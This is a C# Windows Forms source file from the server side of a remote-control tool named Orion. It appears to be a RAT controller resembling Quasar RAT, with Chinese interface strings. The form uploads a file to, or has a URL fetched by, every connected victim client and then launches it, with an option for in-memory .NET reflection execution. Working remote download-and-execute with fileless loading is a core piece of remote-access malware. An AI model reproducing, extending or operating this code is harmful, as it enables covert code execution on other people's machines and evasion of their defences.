using Orion.Common.Enums;
using Orion.Common.Messages;
using Orion.Server.Forms.DarkMode;
using Orion.Server.Helper;
using Orion.Server.Messages;
using Orion.Server.Models;
using Orion.Server.Networking;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Windows.Forms;

namespace Orion.Server.Forms
{
    public partial class FrmRemoteExecution : Form
    {
        private class RemoteExecutionMessageHandler
        {
            public FileManagerHandler FileHandler;
            public TaskManagerHandler TaskHandler;
        }

        /// <summary>
        /// The clients which can be used for the remote execution.
        /// </summary>
        private readonly Client[] _clients;

        private readonly List<RemoteExecutionMessageHandler> _remoteExecutionMessageHandlers;

        private enum TransferColumn
        {
            Client,
            Status
        }

        private bool _executeInMemoryDotNet;

        public FrmRemoteExecution(Client[] clients)
        {
            _clients = clients;
            _remoteExecutionMessageHandlers = new List<RemoteExecutionMessageHandler>(clients.Length);

            InitializeComponent();

            DarkModeManager.ApplyDarkMode(this);

            foreach (var client in clients)
            {
                var remoteExecutionMessageHandler = new RemoteExecutionMessageHandler
                {
                    FileHandler = new FileManagerHandler(client),
                    TaskHandler = new TaskManagerHandler(client)
                };

                var lvi = new ListViewItem(new[]
                {
                    $"{client.Value.Username}@{client.Value.PcName} [{client.EndPoint.Address}:{client.EndPoint.Port}]",
                    "等待中..."
                })
                { Tag = remoteExecutionMessageHandler };

                lstTransfers.Items.Add(lvi);
                _remoteExecutionMessageHandlers.Add(remoteExecutionMessageHandler);
                RegisterMessageHandler(remoteExecutionMessageHandler);
            }
        }

        /// <summary>
        /// Registers the message handlers for client communication.
        /// </summary>
        private void RegisterMessageHandler(RemoteExecutionMessageHandler remoteExecutionMessageHandler)
        {
            // TODO handle disconnects
            remoteExecutionMessageHandler.TaskHandler.ProcessActionPerformed += ProcessActionPerformed;
            remoteExecutionMessageHandler.FileHandler.ProgressChanged += SetStatusMessage;
            remoteExecutionMessageHandler.FileHandler.FileTransferUpdated += FileTransferUpdated;
            MessageHandler.Register(remoteExecutionMessageHandler.FileHandler);
            MessageHandler.Register(remoteExecutionMessageHandler.TaskHandler);
        }

        /// <summary>
        /// Unregisters the message handlers.
        /// </summary>
        private void UnregisterMessageHandler(RemoteExecutionMessageHandler remoteExecutionMessageHandler)
        {
            MessageHandler.Unregister(remoteExecutionMessageHandler.TaskHandler);
            MessageHandler.Unregister(remoteExecutionMessageHandler.FileHandler);
            remoteExecutionMessageHandler.FileHandler.ProgressChanged -= SetStatusMessage;
            remoteExecutionMessageHandler.FileHandler.FileTransferUpdated -= FileTransferUpdated;
            remoteExecutionMessageHandler.TaskHandler.ProcessActionPerformed -= ProcessActionPerformed;
        }

        private void FrmRemoteExecution_Load(object sender, EventArgs e)
        {
            this.Text = WindowHelper.GetWindowTitle("远程执行", _clients.Length);
        }

        private void FrmRemoteExecution_FormClosing(object sender, FormClosingEventArgs e)
        {
            foreach (var handler in _remoteExecutionMessageHandlers)
            {
                UnregisterMessageHandler(handler);
                handler.FileHandler.Dispose();
            }

            _remoteExecutionMessageHandlers.Clear();
            lstTransfers.Items.Clear();
        }

        private void btnExecute_Click(object sender, EventArgs e)
        {
            _executeInMemoryDotNet = chkBoxReflectionExecute.Checked;

            // Validate file type if Reflection Execute is selected
            if (_executeInMemoryDotNet && !radioURL.Checked)
            {
                if (!txtPath.Text.EndsWith(".exe", StringComparison.OrdinalIgnoreCase))
                {
                    MessageBox.Show("反射执行只能运行 .exe 文件。", "无效的文件类型", MessageBoxButtons.OK, MessageBoxIcon.Error);
                    return;
                }
            }

            if (radioURL.Checked)
            {
                foreach (var handler in _remoteExecutionMessageHandlers)
                {
                    if (!txtURL.Text.StartsWith("http", StringComparison.OrdinalIgnoreCase))
                        txtURL.Text = "http://" + txtURL.Text;

                    handler.TaskHandler.StartProcessFromWeb(txtURL.Text, false, _executeInMemoryDotNet);
                }
            }
            else
            {
                foreach (var handler in _remoteExecutionMessageHandlers)
                {
                    handler.FileHandler.BeginUploadFile(txtPath.Text, "");
                }
            }
        }

        private void btnBrowse_Click(object sender, EventArgs e)
        {
            using (OpenFileDialog ofd = new OpenFileDialog())
            {
                ofd.Multiselect = false;

                // Check if any checkbox on the form is checked
                bool anyChecked = this.Controls.OfType<CheckBox>().Any(cb => cb.Checked);

                ofd.Filter = anyChecked
                    ? "可执行文件 (*.exe)|*.exe"
                    : "所有文件 (*.*)|*.*";

                if (ofd.ShowDialog() == DialogResult.OK)
                {
                    txtPath.Text = ofd.FileName;
                }
            }

        }

        private void radioLocalFile_CheckedChanged(object sender, EventArgs e)
        {
            groupLocalFile.Enabled = radioLocalFile.Checked;
            groupURL.Enabled = !radioLocalFile.Checked;
        }

        private void radioURL_CheckedChanged(object sender, EventArgs e)
        {
            groupLocalFile.Enabled = !radioURL.Checked;
            groupURL.Enabled = radioURL.Checked;
        }

        /// <summary>
        /// Called whenever a file transfer gets updated.
        /// </summary>
        /// <param name="sender">The message processor which raised the event.</param>
        /// <param name="transfer">The updated file transfer.</param>
        private void FileTransferUpdated(object sender, FileTransfer transfer)
        {
            for (var i = 0; i < lstTransfers.Items.Count; i++)
            {
                var handler = (RemoteExecutionMessageHandler)lstTransfers.Items[i].Tag;

                if (handler.FileHandler.Equals(sender as FileManagerHandler) || handler.TaskHandler.Equals(sender as TaskManagerHandler))
                {
                    lstTransfers.Items[i].SubItems[(int)TransferColumn.Status].Text = transfer.Status;

                    if (transfer.Status == "Completed")
                    {
                        var pathToStart = transfer.Type == Enums.TransferType.Upload ? transfer.LocalPath : transfer.RemotePath;
                        handler.TaskHandler.StartProcess(pathToStart, false, _executeInMemoryDotNet);
                    }
                    return;
                }
            }
        }

        // TODO: update documentation
        /// <summary>
        /// Sets the status of the file manager.
        /// </summary>
        /// <param name="sender">The message handler which raised the event.</param>
        /// <param name="message">The new status.</param>
        private void SetStatusMessage(object sender, string message)
        {
            for (var i = 0; i < lstTransfers.Items.Count; i++)
            {
                var handler = (RemoteExecutionMessageHandler)lstTransfers.Items[i].Tag;

                if (handler.FileHandler.Equals(sender as FileManagerHandler) || handler.TaskHandler.Equals(sender as TaskManagerHandler))
                {
                    lstTransfers.Items[i].SubItems[(int)TransferColumn.Status].Text = message;
                    return;
                }
            }
        }

        private void ProcessActionPerformed(object sender, ProcessAction action, bool result)
        {
            if (action != ProcessAction.Start) return;

            for (var i = 0; i < lstTransfers.Items.Count; i++)
            {
                var handler = (RemoteExecutionMessageHandler)lstTransfers.Items[i].Tag;

                if (handler.FileHandler.Equals(sender as FileManagerHandler) || handler.TaskHandler.Equals(sender as TaskManagerHandler))
                {
                    lstTransfers.Items[i].SubItems[(int)TransferColumn.Status].Text = result ? "成功启动进程" : "启动进程失败";
                    return;
                }
            }
        }

        private void chkBoxReflectionExecute_CheckedChanged(object sender, EventArgs e)
        {
        }

    }
}
